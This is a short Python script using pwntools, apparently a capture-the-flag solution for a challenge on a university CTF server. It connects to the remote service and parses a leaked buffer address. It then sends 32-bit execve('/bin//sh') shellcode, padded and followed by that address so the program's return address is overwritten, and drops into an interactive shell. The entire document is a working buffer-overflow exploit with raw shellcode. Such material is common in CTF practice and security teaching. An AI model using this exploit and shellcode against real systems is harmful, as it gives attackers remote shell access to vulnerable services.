#!/usr/bin/env python

from pwn import *

# r = process('./foo_1')
r = remote('bamboofox.cs.nctu.edu.tw', 10101)

shellcode = '\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'

r.recvuntil(': ')
buf = int(r.recvline()[:-1], 16)
r.sendline(shellcode.ljust(24, '\x00') + p32(buf))

r.interactive()
